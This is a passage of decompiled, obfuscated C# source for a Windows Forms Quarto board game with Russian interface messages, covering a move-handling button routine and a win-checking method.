					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num = (int)(num2 * 1224370420) ^ -702425161;
						continue;
					}
					num7 = 0;
					goto IL_012d;
				case 5u:
					num3++;
					num = (int)((num2 * 1663429855) ^ 0x4903F329);
					continue;
				case 4u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.Red, 3f), ((float)num5 + 0.05f) * (float)size, ((float)num6 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num3, num4]), num5 * size + 4, num6 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = ((int)num2 * -868686695) ^ 0xE94DC37;
					continue;
				case 3u:
					flag2 = num3 < 4;
					num = 645584371;
					continue;
				case 2u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -1418311120) ^ 0x18918472;
					continue;
				case 1u:
					num5 = Form1.smethod_38(e) / size;
					num = ((int)num2 * -1310467649) ^ 0x6F9797CF;
					continue;
				case 0u:
					flag = Form1.smethod_41((Control)(object)borderBox[num3, num4]) == Color.Blue;
					num = 1228697451;
					continue;
				default:
					return;
				case 26u:
					break;
				case 15u:
					return;
					IL_012d:
					flag3 = (byte)num7 != 0;
					num = 70042257;
					continue;
				}
				break;
			}
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_02a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d5: Expected O, but got Unknown
		bool flag9 = default(bool);
		int num23 = default(int);
		int num13 = default(int);
		int num17 = default(int);
		Graphics graphics_ = default(Graphics);
		int num31 = default(int);
		int num32 = default(int);
		int num51 = default(int);
		int num6 = default(int);
		int num14 = default(int);
		bool flag16 = default(bool);
		Figurine[,] array3 = default(Figurine[,]);
		int num3 = default(int);
		int num27 = default(int);
		bool flag12 = default(bool);
		int num5 = default(int);
		bool flag8 = default(bool);
		int num33 = default(int);
		int num19 = default(int);
		int num28 = default(int);
		int num37 = default(int);
		int num45 = default(int);
		int num9 = default(int);
		int num18 = default(int);
		bool flag10 = default(bool);
		bool flag = default(bool);
		bool flag6 = default(bool);
		bool flag5 = default(bool);
		bool flag2 = default(bool);
		int num10 = default(int);
		int num26 = default(int);
		Figurine[,] array = default(Figurine[,]);
		bool flag13 = default(bool);
		bool flag11 = default(bool);
		bool flag14 = default(bool);
		bool flag15 = default(bool);
		Figurine[,] array2 = default(Figurine[,]);
		bool flag4 = default(bool);
		int num29 = default(int);
		bool flag7 = default(bool);
		bool flag3 = default(bool);
		while (true)
		{
			int num = 164451273;
			while (true)
			{
				uint num2;
				int num50;
				int num30;
				int num59;
				int num58;
				switch ((num2 = (uint)num ^ 0x3221F1BEu) % 185u)
				{
				case 184u:
					flag9 = Standoff(board);
					num = 1370492049;
					continue;
				case 183u:
					num23 = num13;
					num = (int)((num2 * 883728051) ^ 0x67BC715A);
					continue;
				case 182u:
					num17 = 0;
					num = 445624569;
					continue;
				case 181u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)((num2 * 1141960683) ^ 0x3B51608);
					continue;
				case 180u:
					num = (int)(num2 * 1270145887) ^ -104029455;
					continue;
				case 179u:
					Paint_Board();
					num = (int)(num2 * 196655450) ^ -1060908556;
					continue;
				case 178u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num31 + 0.05f) * (float)size, ((float)num32 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = (int)(num2 * 33725673) ^ -1758533100;
					continue;
				case 177u:
					if (num51 >= 9)
					{
						num = 1285632382;
						num50 = 1285632382;
						continue;
					}
					goto IL_00f9;
				case 176u:
					num6++;
					num = 1194527204;
					continue;
				case 175u:
					num6 = 0;
					num = 1657541750;
					continue;
				case 174u:
					Form1.smethod_47(200);
					num = (int)((num2 * 65235157) ^ 0x30FC9E3E);
					continue;
				case 173u:
					num = ((int)num2 * -429672237) ^ 0x216E131B;
					continue;
				case 172u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = ((int)num2 * -656565855) ^ 0x4523E6EC;
					continue;
				case 171u:
					num = (int)((num2 * 1020548448) ^ 0x7ED6C350);
					continue;
				case 170u:
					num = ((int)num2 * -299320960) ^ 0x7A61A2B6;
					continue;
				case 168u:
					num13++;
					num = ((int)num2 * -1395930380) ^ -52848517;
					continue;
				case 167u:
					num14 = 0;
					num = (int)((num2 * 1110452407) ^ 0x25472573);
					continue;
				case 166u:
					num = ((int)num2 * -1440621371) ^ -1204496370;
					continue;
				case 165u:
					flag16 = array3[num3, num27] == null;
					num = 1564527838;
					continue;
				case 164u:
					flag12 = num27 < 4;
					num = 387399530;
					continue;
				case 163u:
					Form1.smethod_30((Control)(object)pictureBox[num5, num6]);
					num = ((int)num2 * -407066147) ^ 0x25790D72;
					continue;
				case 162u:
					num51 = 0;
					num = (int)(num2 * 1596987278) ^ -1851079617;
					continue;
				case 161u:
				{
					int num60;
					int num61;
					if (!flag8)
					{
						num60 = 1533722698;
						num61 = 1533722698;
					}
					else
					{
						num60 = 1136931319;
						num61 = 1136931319;
					}
					num = num60 ^ (int)(num2 * 2135492353);
					continue;
				}
				case 160u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = (int)(num2 * 1928200254) ^ -1228765109;
					continue;
				case 159u:
				{
					int num57;
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), num6 * size + size / 2, (int)(((float)num5 + 0.05f) * (float)size)) == Color.FromArgb(255, 255, 0, 0))
					{
						num = 200130282;
						num57 = 200130282;
					}
					else
					{
						num = 864821427;
						num57 = 864821427;
					}
					continue;
				}
				case 158u:
					if (num33 == num23)
					{
						num = ((int)num2 * -182576045) ^ 0x401F4160;
						continue;
					}
					num30 = 0;
					goto IL_0323;
				case 157u:
					Form1.smethod_47(1000);
					num = ((int)num2 * -1606045920) ^ 0x5FBEE23C;
					continue;
				case 156u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num17 + 0.05f) * (float)size, ((float)num19 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num23, num28]), num17 * size + 4, num19 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)(num2 * 2137542335) ^ -51958209;
					continue;
				case 155u:
					num = (int)((num2 * 2038306888) ^ 0x4B11338D);
					continue;
				case 154u:
				{
					int num46;
					int num47;
					if (!flag12)
					{
						num46 = 342190795;
						num47 = 342190795;
					}
					else
					{
						num46 = 1123237437;
						num47 = 1123237437;
					}
					num = num46 ^ (int)(num2 * 778107118);
					continue;
				}
				case 153u:
					Form1.smethod_5((Control)(object)borderBox[num5, num6], Color.White);
					num = (int)((num2 * 1881250142) ^ 0x4941F109);
					continue;
				case 152u:
					Form1.smethod_30((Control)(object)borderBox[num13, num37]);
					num = ((int)num2 * -1869132819) ^ 0x446030DC;
					continue;
				case 151u:
					board[num45, num9] = new Figurine(storage[num14, num18]);
					num = (int)((num2 * 1691268234) ^ 0x280B787D);
					continue;
				case 150u:
				{
					int num41;
					int num42;
					if (flag10)
					{
						num41 = 2135436725;
						num42 = 2135436725;
					}
					else
					{
						num41 = 1643515634;
						num42 = 1643515634;
					}
					num = num41 ^ (int)(num2 * 1111181659);
					continue;
				}
				case 149u:
					Form1.smethod_7((Control)(object)pictureBox[num13, num37], bool_0: false);
					flag = Form1.smethod_41((Control)(object)borderBox[num13, num37]) == Color.Red;
					num = ((int)num2 * -619243013) ^ -507932447;
					continue;
				case 148u:
					num = ((int)num2 * -690322531) ^ -589546195;
					continue;
				case 147u:
					num = 709147289;
					continue;
				case 146u:
					num = 1017885300;
					continue;
				case 145u:
					Form1.smethod_15(timer1);
					num = 1580768514;
					continue;
				case 144u:
					num = ((int)num2 * -1423004654) ^ -1537383533;
					continue;
				case 143u:
					num = (int)((num2 * 448363756) ^ 0x1D1BFDF8);
					continue;
				case 142u:
				{
					int num21;
					int num22;
					if (flag6)
					{
						num21 = 136345333;
						num22 = 136345333;
					}
					else
					{
						num21 = 1214361088;
						num22 = 1214361088;
					}
					num = num21 ^ ((int)num2 * -385397922);
					continue;
				}
				case 141u:
					num = (int)(num2 * 575963167) ^ -1373186939;
					continue;
				case 140u:
					flag5 = num17 < 4;
					num = 405513594;
					continue;
				case 139u:
					num = (int)((num2 * 1244297293) ^ 0x56165463);
					continue;
				case 138u:
					num = (int)((num2 * 1153680579) ^ 0x2ED263C6);
					continue;
				case 137u:
				{
					int num7;
					int num8;
					if (flag)
					{
						num7 = 1188401313;
						num8 = 1188401313;
					}
					else
					{
						num7 = 761945763;
						num8 = 761945763;
					}
					num = num7 ^ (int)(num2 * 1464165526);
					continue;
				}
				case 136u:
				{
					int num64;
					int num65;
					if (flag2)
					{
						num64 = -349403478;
						num65 = -349403478;
					}
					else
					{
						num64 = -2031953511;
						num65 = -2031953511;
					}
					num = num64 ^ ((int)num2 * -20273554);
					continue;
				}
				case 135u:
					num = 192950454;
					continue;
				case 134u:
					num18 = 0;
					num45 = 0;
					num9 = 0;
					num5 = 0;
					num = ((int)num2 * -1684197631) ^ -1955831108;
					continue;
				case 133u:
					num = ((int)num2 * -881198750) ^ 0x533A7EAD;
					continue;
				case 132u:
					Form1.smethod_5((Control)(object)borderBox[num23, num28], Color.White);
					num = ((int)num2 * -183162639) ^ -2090644566;
					continue;
				case 131u:
					num = (int)((num2 * 2139032048) ^ 0x121561D5);
					continue;
				case 130u:
					num = (int)(num2 * 1242946242) ^ -1280100485;
					continue;
				case 129u:
					num = ((int)num2 * -1333101265) ^ -1478771862;
					continue;
				case 128u:
					Form1.smethod_7((Control)(object)pictureBox[num10, num26], bool_0: true);
					num26++;
					num = 337135722;
					continue;
				case 127u:
					if (!Stop(board))
					{
						num = ((int)num2 * -1923644624) ^ 0x7B1625A7;
						continue;
					}
					goto IL_0743;
				case 126u:
					num5++;
					num = ((int)num2 * -638739153) ^ -303114478;
					continue;
				case 125u:
					Form1.smethod_20(pictureBox[num5, num6], (Image)null);
					num = (int)(num2 * 1760275920) ^ -1596259945;
					continue;
				case 124u:
					Form1.smethod_32((Control)(object)richTextBox1, "QUARTO! Компьютер выиграл!");
					num = 487194657;
					continue;
				case 123u:
					flag10 = num6 < 4;
					num = 1738884114;
					continue;
				case 122u:
					num = ((int)num2 * -495769590) ^ -908481245;
					continue;
				case 121u:
					num59 = (Standoff(array) ? 1 : 0);
					goto IL_07da;
				case 120u:
				{
					int num62;
					int num63;
					if (!flag16)
					{
						num62 = -1672484327;
						num63 = -1672484327;
					}
					else
					{
						num62 = -262413082;
						num63 = -262413082;
					}
					num = num62 ^ (int)(num2 * 1210325033);
					continue;
				}
				case 119u:
					Form1.smethod_47(200);
					num = ((int)num2 * -1634634165) ^ -1333479072;
					continue;
				case 118u:
					if (!Stop(array))
					{
						num = ((int)num2 * -436328998) ^ -1582901413;
						continue;
					}
					num59 = 1;
					goto IL_07da;
				case 117u:
					Form1.smethod_30((Control)(object)borderBox[num5, num6]);
					num = ((int)num2 * -1580278522) ^ -1947127541;
					continue;
				case 116u:
					num = 396302493;
					continue;
				case 115u:
					Form1.smethod_20(pictureBox[num23, num28], (Image)null);
					num = (int)(num2 * 1849371605) ^ -319586845;
					continue;
				case 114u:
					num37 = 0;
					num = 754707126;
					continue;
				case 113u:
					num = ((int)num2 * -1786779311) ^ -2039536161;
					continue;
				case 112u:
					num10 = 0;
					num = (int)(num2 * 1183500047) ^ -1916841941;
					continue;
				case 111u:
					num19 = 0;
					num = (int)(num2 * 1013689057) ^ -1430101849;
					continue;
				case 110u:
					num = 161234553;
					continue;
				case 109u:
					num = ((int)num2 * -375524429) ^ -1987644964;
					continue;
				case 108u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = ((int)num2 * -20353199) ^ 0x19D6AFCB;
					continue;
				case 107u:
					num = ((int)num2 * -1019845493) ^ 0x2AE5B640;
					continue;
				case 106u:
					num = (int)(num2 * 478014986) ^ -162405254;
					continue;
				case 105u:
					array[num19, num17] = new Figurine(storage[num23, num28]);
					num = (int)(num2 * 1615321187) ^ -419780385;
					continue;
				case 104u:
					num51++;
					flag13 = false;
					num = 1228753324;
					continue;
				case 103u:
					num = ((int)num2 * -1220721208) ^ -1235150603;
					continue;
				case 102u:
					if (!Standoff(board))
					{
						num = 692671315;
						num58 = 692671315;
						continue;
					}
					goto IL_0743;
				case 101u:
					flag11 = board[num32, num31] != null;
					num = ((int)num2 * -1246157045) ^ -1526594636;
					continue;
				case 100u:
				{
					int num56;
					if (!(Form1.smethod_41((Control)(object)borderBox[num5, num6]) == Color.Blue))
					{
						num = 305676231;
						num56 = 305676231;
					}
					else
					{
						num = 1007225520;
						num56 = 1007225520;
					}
					continue;
				}
				case 99u:
					num = ((int)num2 * -1872201684) ^ -348335723;
					continue;
				case 98u:
					if (!flag13)
					{
						num = ((int)num2 * -1741914109) ^ -339791786;
						continue;
					}
					goto IL_00f9;
				case 97u:
					num10++;
					num = (int)(num2 * 1857205570) ^ -625034926;
					continue;
				case 96u:
					num28 = 0;
					num = (int)(num2 * 1188788188) ^ -696917891;
					continue;
				case 95u:
					flag14 = num19 < 4;
					num = 1423517738;
					continue;
				case 94u:
					num = ((int)num2 * -2039941960) ^ -1632739743;
					continue;
				case 93u:
					num45 = num5;
					num = ((int)num2 * -1159905219) ^ 0x4C87A2CA;
					continue;
				case 92u:
					num = 1327603097;
					continue;
				case 91u:
				{
					int num54;
					int num55;
					if (flag15)
					{
						num54 = -90329221;
						num55 = -90329221;
					}
					else
					{
						num54 = -580991588;
						num55 = -580991588;
					}
					num = num54 ^ (int)(num2 * 2029341573);
					continue;
				}
				case 90u:
					board[num32, num31] = new Figurine(storage[num23, num28]);
					num = (int)(num2 * 818696215) ^ -1293720974;
					continue;
				case 89u:
					Form1.smethod_30((Control)(object)pictureBox[num23, num28]);
					num = (int)(num2 * 1077890522) ^ -1702088922;
					continue;
				case 88u:
					num = (int)(num2 * 1236442997) ^ -38335411;
					continue;
				case 87u:
					Form1.smethod_30((Control)(object)borderBox[num23, num28]);
					num = ((int)num2 * -257108912) ^ -1596487073;
					continue;
				case 86u:
					array2 = (Figurine[,])Form1.smethod_48((Array)array3);
					num = (int)((num2 * 2047152268) ^ 0x6895B677);
					continue;
				case 85u:
				{
					int num52;
					int num53;
					if (flag14)
					{
						num52 = 99595456;
						num53 = 99595456;
					}
					else
					{
						num52 = 102921123;
						num53 = 102921123;
					}
					num = num52 ^ ((int)num2 * -490830650);
					continue;
				}
				case 84u:
					num = (int)(num2 * 491118552) ^ -1861958754;
					continue;
				case 83u:
					num27 = 0;
					num = 712931833;
					continue;
				case 82u:
				{
					int num48;
					int num49;
					if (Standoff(board))
					{
						num48 = -2094197071;
						num49 = -2094197071;
					}
					else
					{
						num48 = -143607289;
						num49 = -143607289;
					}
					num = num48 ^ (int)(num2 * 704067437);
					continue;
				}
				case 81u:
					Form1.smethod_30((Control)(object)pictureBox[num23, num28]);
					num = (int)(num2 * 1727446484) ^ -1927793748;
					continue;
				case 80u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)((num2 * 694596456) ^ 0x1005BF35);
					continue;
				case 79u:
					num = ((int)num2 * -2006409610) ^ 0x26F6671A;
					continue;
				case 78u:
					num17++;
					num = 445624569;
					continue;
				case 77u:
					num = ((int)num2 * -329879833) ^ 0x48B63E4;
					continue;
				case 76u:
					flag4 = num5 < 4;
					num = 1679773076;
					continue;
				case 75u:
					num = (int)(num2 * 755141401) ^ -1078582913;
					continue;
				case 74u:
					Form1.smethod_32((Control)(object)richTextBox1, "Выберете фигуру, которой будет играть противник.");
					num = (int)(num2 * 1132908500) ^ -1722365759;
					continue;
				case 73u:
					Form1.smethod_30((Control)(object)label2);
					num = ((int)num2 * -1898767251) ^ -377013705;
					continue;
				case 72u:
					Form1.smethod_5((Control)(object)borderBox[num13, num37], Color.LimeGreen);
					num = (int)(num2 * 716771059) ^ -193829333;
					continue;
				case 71u:
					num = ((int)num2 * -40485308) ^ 0x768E792F;
					continue;
				case 70u:
					storage[num14, num18] = null;
					num = ((int)num2 * -679980278) ^ 0x6F2C69A5;
					continue;
				case 69u:
					num = (int)((num2 * 399850362) ^ 0x1051E993);
					continue;
				case 68u:
					flag13 = true;
					num = ((int)num2 * -1425103705) ^ 0x690524F5;
					continue;
				case 67u:
					if (storage[num33, num29] != null)
					{
						num = ((int)num2 * -764596100) ^ 0x1BF1E7C1;
						continue;
					}
					num30 = 1;
					goto IL_0323;
				case 66u:
					array3 = (Figurine[,])Form1.smethod_48((Array)board);
					num = ((int)num2 * -1485229498) ^ -758876117;
					continue;
				case 65u:
					num = (int)((num2 * 230774511) ^ 0x526366B3);
					continue;
				case 64u:
					Form1.smethod_30((Control)(object)borderBox[num23, num28]);
					num = (int)(num2 * 440555473) ^ -1398656780;
					continue;
				case 63u:
					(menu as Form3).ContinueLock();
					num = (int)((num2 * 2139575409) ^ 0x3606608B);
					continue;
				case 62u:
					num = (int)(num2 * 1183227754) ^ -525766294;
					continue;
				case 61u:
					array3[num32, num31] = new Figurine(storage[num23, num28]);
					num3 = 0;
					num = (int)((num2 * 7928306) ^ 0x44B9A1CD);
					continue;
				case 60u:
					Form1.smethod_5((Control)(object)borderBox[num33, num29], Color.Blue);
					Form1.smethod_30((Control)(object)borderBox[num33, num29]);
					num = (int)(num2 * 1405577378) ^ -1216177912;
					continue;
				case 59u:
					num = (int)((num2 * 1541428967) ^ 0x747B4F67);
					continue;
				case 58u:
					num14 = num5;
					num = ((int)num2 * -1131113168) ^ 0x81CCDFD;
					continue;
				case 57u:
					step++;
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = (int)(num2 * 2114887582) ^ -1230120500;
					continue;
				case 56u:
				{
					int num43;
					int num44;
					if (flag11)
					{
						num43 = -1766611034;
						num44 = -1766611034;
					}
					else
					{
						num43 = -1614783196;
						num44 = -1614783196;
					}
					num = num43 ^ ((int)num2 * -457297091);
					continue;
				}
				case 55u:
					num = (int)(num2 * 2056949145) ^ -1282532578;
					continue;
				case 54u:
					num32 = Form1.smethod_33(rnd, 4);
					num = (int)((num2 * 815363977) ^ 0x161EB5CD);
					continue;
				case 53u:
					Form1.smethod_5((Control)(object)borderBox[num23, num28], Color.White);
					num = (int)((num2 * 1969583945) ^ 0x7D1F7794);
					continue;
				case 52u:
					storage[num23, num28] = null;
					num = (int)((num2 * 1311410377) ^ 0xEAB4143);
					continue;
				case 51u:
					num37++;
					num = (int)((num2 * 223700377) ^ 0x2D88DF0C);
					continue;
				case 50u:
					num33 = Form1.smethod_33(rnd, 4);
					num = 760571986;
					continue;
				case 49u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = (int)(num2 * 131599516) ^ -950337214;
					continue;
				case 48u:
					num28 = num37;
					num = ((int)num2 * -116275461) ^ -1911690398;
					continue;
				case 47u:
				{
					int num39;
					int num40;
					if (!flag5)
					{
						num39 = -1825820676;
						num40 = -1825820676;
					}
					else
					{
						num39 = -358574892;
						num40 = -358574892;
					}
					num = num39 ^ ((int)num2 * -905094758);
					continue;
				}
				case 46u:
					num = ((int)num2 * -1175252415) ^ -1966452492;
					continue;
				case 45u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник сделал ход (зелёный). Выберете поле на доске для выбронной противником фигуры (синий).");
					num = (int)(num2 * 486580939) ^ -1315310042;
					continue;
				case 44u:
					num3++;
					num = ((int)num2 * -1669572249) ^ -2129924776;
					continue;
				case 43u:
				{
					int num38;
					if (num37 >= 4)
					{
						num = 559880249;
						num38 = 559880249;
					}
					else
					{
						num = 1870529143;
						num38 = 1870529143;
					}
					continue;
				}
				case 42u:
					num19++;
					num = ((int)num2 * -484126587) ^ -671292510;
					continue;
				case 41u:
					num = ((int)num2 * -2117007630) ^ 0x33BEEEF4;
					continue;
				case 40u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = (int)((num2 * 1019364833) ^ 0x11E3D9B5);
					continue;
				case 39u:
					Form1.smethod_15(timer1);
					num = (int)(num2 * 633574059) ^ -645698574;
					continue;
				case 38u:
					Form1.smethod_20(pictureBox[num23, num28], (Image)null);
					num = ((int)num2 * -801640472) ^ 0x590126EB;
					continue;
				case 37u:
					num = ((int)num2 * -987964014) ^ 0xB29E4FD;
					continue;
				case 36u:
					num13 = 0;
					num = (int)(num2 * 1053439659) ^ -1501057226;
					continue;
				case 35u:
					num31 = Form1.smethod_33(rnd, 4);
					num = (int)(num2 * 1739934734) ^ -661380593;
					continue;
				case 33u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = ((int)num2 * -1447727016) ^ 0x32D1B12C;
					continue;
				case 32u:
				{
					int num36;
					if (num26 >= 4)
					{
						num = 889130433;
						num36 = 889130433;
					}
					else
					{
						num = 1568806422;
						num36 = 1568806422;
					}
					continue;
				}
				case 31u:
					flag6 = Form1.smethod_46((Control)(object)pictureBox1);
					num = ((int)num2 * -504516462) ^ -739547435;
					continue;
				case 30u:
					Form1.smethod_32((Control)(object)richTextBox1, "Подождите, компьютер делает свой ход.");
					num = (int)(num2 * 1968886745) ^ -679803169;
					continue;
				case 29u:
				{
					int num34;
					int num35;
					if (flag9)
					{
						num34 = -1617952881;
						num35 = -1617952881;
					}
					else
					{
						num34 = -1615467669;
						num35 = -1615467669;
					}
					num = num34 ^ (int)(num2 * 252589176);
					continue;
				}
				case 28u:
					Form1.smethod_30((Control)(object)richTextBox1);
					num = (int)(num2 * 1296465249) ^ -721848031;
					continue;
				case 27u:
					array2[num3, num27] = new Figurine(storage[num33, num29]);
					flag8 = Stop(array2);
					num = (int)((num2 * 1832303537) ^ 0x62C9EC33);
					continue;
				case 26u:
					num = (int)((num2 * 2118769764) ^ 0x3A4CE6F);
					continue;
				case 25u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num23, num28]), num31 * size + 4, num32 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = ((int)num2 * -1288158234) ^ -1485648186;
					continue;
				case 24u:
					board[num19, num17] = new Figurine(storage[num23, num28]);
					num = (int)((num2 * 420886819) ^ 0x60AD853);
					continue;
				case 23u:
					num = 2085476884;
					continue;
				case 22u:
					num30 = ((num29 == num28) ? 1 : 0);
					goto IL_0323;
				case 21u:
					num29 = Form1.smethod_33(rnd, 4);
					num = (int)(num2 * 1532999566) ^ -1548612760;
					continue;
				case 20u:
					storage[num23, num28] = null;
					num = ((int)num2 * -1873879451) ^ -1023127361;
					continue;
				case 19u:
					num27++;
					num = 703806125;
					continue;
				case 18u:
					num26 = 0;
					num = 757927372;
					continue;
				case 17u:
				{
					int num24;
					int num25;
					if (!flag7)
					{
						num24 = 781622642;
						num25 = 781622642;
					}
					else
					{
						num24 = 995830305;
						num25 = 995830305;
					}
					num = num24 ^ ((int)num2 * -1605583941);
					continue;
				}
				case 16u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -1825295467) ^ 0x6E9B3AB8;
					continue;
				case 15u:
					num = (int)(num2 * 737408990) ^ -282430385;
					continue;
				case 14u:
					(menu as Form3).ContinueLock();
					num = (int)((num2 * 995988738) ^ 0x50A2F49C);
					continue;
				case 13u:
					num23 = 0;
					num = ((int)num2 * -2037611678) ^ 0x73412272;
					continue;
				case 12u:
				{
					int num20;
					if (board[num19, num17] != null)
					{
						num = 13474314;
						num20 = 13474314;
					}
					else
					{
						num = 593930789;
						num20 = 593930789;
					}
					continue;
				}
				case 11u:
					flag3 = num13 < 4;
					num = 894153462;
					continue;
				case 10u:
					step++;
					num = ((int)num2 * -1765121806) ^ -821345341;
					continue;
				case 9u:
					num18 = num6;
					num = (int)(num2 * 2090727533) ^ -1056945301;
					continue;
				case 8u:
				{
					int num15;
					int num16;
					if (flag4)
					{
						num15 = 1499850612;
						num16 = 1499850612;
					}
					else
					{
						num15 = 827944310;
						num16 = 827944310;
					}
					num = num15 ^ (int)(num2 * 128814058);
					continue;
				}
				case 7u:
				{
					int num11;
					int num12;
					if (!flag3)
					{
						num11 = -505485385;
						num12 = -505485385;
					}
					else
					{
						num11 = -274156127;
						num12 = -274156127;
					}
					num = num11 ^ (int)(num2 * 1946278760);
					continue;
				}
				case 6u:
					num = ((int)num2 * -729074912) ^ -2072985933;
					continue;
				case 5u:
					flag2 = num10 < 4;
					num = 714591950;
					continue;
				case 4u:
					num9 = num6;
					num = ((int)num2 * -1896576439) ^ -73937885;
					continue;
				case 3u:
					array = (Figurine[,])Form1.smethod_48((Array)board);
					num = (int)(num2 * 1448756149) ^ -1953926784;
					continue;
				case 2u:
					num = 13474314;
					continue;
				case 1u:
				{
					int num4;
					if (num3 < 4)
					{
						num = 821011437;
						num4 = 821011437;
					}
					else
					{
						num = 1105528520;
						num4 = 1105528520;
					}
					continue;
				}
				case 0u:
					num = (int)(num2 * 297526044) ^ -1685234149;
					continue;
				default:
					return;
				case 34u:
					break;
				case 169u:
					return;
					IL_00f9:
					num = 2007855929;
					num50 = 2007855929;
					continue;
					IL_0323:
					flag15 = (byte)num30 != 0;
					num = 244264751;
					continue;
					IL_07da:
					flag7 = (byte)num59 != 0;
					num = 215228658;
					continue;
					IL_0743:
					num = 2000230630;
					num58 = 2000230630;
					continue;
				}
				break;
			}
		}
	}

	private bool Stop(Figurine[,] mem)
	{
		bool flag = default(bool);
		int num4 = default(int);
		bool flag3 = default(bool);
		bool flag2 = default(bool);
		bool result = default(bool);
		while (true)
		{
			int num = 628557752;
			while (true)
			{
				uint num2;
				int num10;
				int num53;
				switch ((num2 = (uint)num ^ 0x75FEC802u) % 78u)
				{
				case 77u:
					flag = true;
					num = ((int)num2 * -20597874) ^ -7545009;
					continue;
				case 76u:
				{
					int num18;
					int num19;
					if (mem[num4, 2] != null)
					{
						num18 = -1105437582;
						num19 = -1105437582;
					}
					else
					{
						num18 = -22995193;
						num19 = -22995193;
					}
					num = num18 ^ ((int)num2 * -318775011);
					continue;
				}
				case 75u:
					flag3 = num4 < 4;
					num = 537481637;
					continue;
				case 74u:
				{
					int num22;
					int num23;
					if (mem[1, 1].Point != mem[2, 2].Point)
					{
						num22 = -1304422222;
						num23 = -1304422222;
					}
					else
					{
						num22 = -848199604;
						num23 = -848199604;
					}
					num = num22 ^ (int)(num2 * 2109831219);
					continue;
				}
				case 73u:
				{
					int num58;
					int num59;
					if (mem[1, 1].Square != mem[2, 2].Square)
					{
						num58 = -310789803;
						num59 = -310789803;
					}
					else
					{
						num58 = -601196963;
						num59 = -601196963;
					}
					num = num58 ^ (int)(num2 * 857116016);
					continue;
				}
				case 72u:
					if (mem[2, num4].Square != mem[3, num4].Square)
					{
						goto IL_00f9;
					}
					goto IL_0105;
				case 71u:
					num4++;
					num = 715475139;
					continue;
				case 70u:
					flag = false;
					num = ((int)num2 * -1879455131) ^ 0x5D2B1FD;
					continue;
				case 69u:
					if (mem[2, 1].Big != mem[3, 0].Big)
					{
						num = (int)(num2 * 1760416436) ^ -912708277;
						continue;
					}
					goto IL_0167;
				case 68u:
				{
					int num6;
					int num7;
					if (mem[num4, 1].Big != mem[num4, 2].Big)
					{
						num6 = 17827776;
						num7 = 17827776;
					}
					else
					{
						num6 = 8235289;
						num7 = 8235289;
					}
					num = num6 ^ (int)(num2 * 939544936);
					continue;
				}
				case 67u:
				{
					int num60;
					int num61;
					if (mem[num4, 0] == null)
					{
						num60 = 1798060097;
						num61 = 1798060097;
					}
					else
					{
						num60 = 989566477;
						num61 = 989566477;
					}
					num = num60 ^ ((int)num2 * -232388262);
					continue;
				}
				case 66u:
				{
					int num41;
					int num42;
					if (mem[num4, 3] == null)
					{
						num41 = 1126286823;
						num42 = 1126286823;
					}
					else
					{
						num41 = 983217877;
						num42 = 983217877;
					}
					num = num41 ^ (int)(num2 * 1398986434);
					continue;
				}
				case 65u:
					if (mem[num4, 2].Point != mem[num4, 3].Point)
					{
						num = ((int)num2 * -1211115894) ^ 0x40E8554D;
						continue;
					}
					goto IL_0105;
				case 64u:
					if (mem[2, 2].Point != mem[3, 3].Point)
					{
						num = (int)(num2 * 1521128352) ^ -42153134;
						continue;
					}
					goto IL_0277;
				case 63u:
				{
					int num8;
					int num9;
					if (mem[num4, 0].Big != mem[num4, 1].Big)
					{
						num8 = -1261413299;
						num9 = -1261413299;
					}
					else
					{
						num8 = -2110142451;
						num9 = -2110142451;
					}
					num = num8 ^ ((int)num2 * -1317510261);
					continue;
				}
				case 62u:
				{
					int num66;
					int num67;
					if (mem[0, num4].Big != mem[1, num4].Big)
					{
						num66 = -1402549563;
						num67 = -1402549563;
					}
					else
					{
						num66 = -932592356;
						num67 = -932592356;
					}
					num = num66 ^ ((int)num2 * -1317614087);
					continue;
				}
				case 61u:
					if (mem[1, 2] != null)
					{
						num = ((int)num2 * -811290295) ^ -2102895115;
						continue;
					}
					goto IL_031c;
				case 60u:
				{
					int num49;
					int num50;
					if (mem[1, 1].Dark != mem[2, 2].Dark)
					{
						num49 = -245984760;
						num50 = -245984760;
					}
					else
					{
						num49 = -72739935;
						num50 = -72739935;
					}
					num = num49 ^ (int)(num2 * 837833305);
					continue;
				}
				case 59u:
					if (mem[2, 1].Point != mem[3, 0].Point)
					{
						num = (int)((num2 * 265188204) ^ 0xFD9812C);
						continue;
					}
					goto IL_0167;
				case 58u:
					if (mem[1, num4] != null)
					{
						num = ((int)num2 * -495451118) ^ -246702745;
						continue;
					}
					goto IL_00f9;
				case 56u:
